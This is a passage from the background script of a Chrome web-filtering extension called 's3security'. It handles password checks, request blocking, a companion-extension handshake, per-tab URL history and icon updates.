			s3security.tmp_domain_list = {};
			s3security.tmp_allow_request_list = {},
			s3security.tmp_deny_subrequest_list = {},
			sendResponse({ 'success' : true });
		}
		//------------------------------------------------------------------
		else if (request.action_check_password) {
			var success = true;
			var password_value = s3security.utils.lazy_crypt_decode(s3security.utils.prefs_get('password_value'));
			if (password_value) {
				success = false;
				if (password_value == request.password_value) {
					success = true;
					//-----------------------------------------------
					var tabId = request.tab_id;
					if (! tabId) {
						if (sender.tab) {
							tabId = sender.tab.id;
						}
					}
					//-----------------------------------------------
					if (tabId) {
						if (! s3security.tab_list[ 'tab' + tabId ]) {
							s3security.tab_list[ 'tab' + tabId ] = {};
						}
						s3security.tab_list[ 'tab' + tabId ].password_exists = true;
					}
				}
			}
			sendResponse({ 'success' : success });
		}
		//------------------------------------------------------------------
	}
);
//------------------------------------------------------------------------------
chrome.runtime.onMessageExternal.addListener(
	function(request, sender, sendResponse) {
		if (sender.id == s3security.server_id) {
			if (request && request.action_check_installed) {
				sendResponse({ 'installed' : true });
				s3security.server_is_installed = true;
			}
		}
	}
);
//------------------------------------------------------------------------------
chrome.webRequest.onBeforeRequest.addListener(
	s3security.onBeforeRequest,
//	{urls: ["<all_urls>"]},
	{urls: ["http://*/*", "https://*/*"]},
	["blocking"]
);
//------------------------------------------------------------------------------
chrome.tabs.onRemoved.addListener(function(tabId, removeInfo) {
	delete (s3security.tab_list[ 'tab' + tabId ]);
});
//------------------------------------------------------------------------------
chrome.tabs.onReplaced.addListener(function(addedTabId, removedTabId) {
	if (! s3security.tab_list[ 'tab' + addedTabId ]) {
		s3security.tab_list[ 'tab' + addedTabId ] = s3security.tab_list[ 'tab' + removedTabId ];
		s3security.tab_list[ 'tab' + addedTabId ].tabId = addedTabId;
	}
	delete (s3security.tab_list[ 'tab' + removedTabId ]);
	s3security.set_tab_status_icon(addedTabId);
});
//------------------------------------------------------------------------------
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
	//------------------------------------------------------------------------
	if (! s3security.check_password_for_tab(tab)) {
		return;
	}
	//-----------------------------------------------------
	if (
		changeInfo.url && (changeInfo.url.indexOf('chrome://newtab') < 0) && (changeInfo.url.indexOf('about:newtab') < 0) && (changeInfo.url.indexOf('about:blank') < 0)
	) {
		if (s3security.tab_list[ 'tab' + tabId ]) {
			if (s3security.tab_list[ 'tab' + tabId ].history) {
				s3security.tab_list[ 'tab' + tabId ].history.push(changeInfo.url);
			}
		}
	}
});
//------------------------------------------------------------------------------
chrome.tabs.onCreated.addListener(function(tab) {
	if (! s3security.tab_list[ 'tab' + tab.id ]) {
		s3security.tab_list[ 'tab' + tab.id ] = {};
	}
	s3security.tab_list[ 'tab' + tab.id ].history = [];
});
//------------------------------------------------------------------------------
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
	s3security.set_tab_status_icon(tabId);
});
//------------------------------------------------------------------------------
chrome.notifications.onClicked.addListener(function(notificationId) {
	if (notificationId == 'FWS_notification_server_install_requred') {
		chrome.notifications.clear(notificationId);
		window.open(s3security.server_url);
		s3security.check_is_server_timer = 5*60*1000;
	}
});
//------------------------------------------------------------------------------
chrome.tabs.onHighlighted.addListener(function(){ s3security.set_context_menu(); });
chrome.tabs.onActivated.addListener(function(){ s3security.set_context_menu(); });
chrome.windows.onFocusChanged.addListener(function(windowId){ s3security.set_context_menu(); });
//------------------------------------------------------------------------------
setTimeout(s3security.init, 1000);
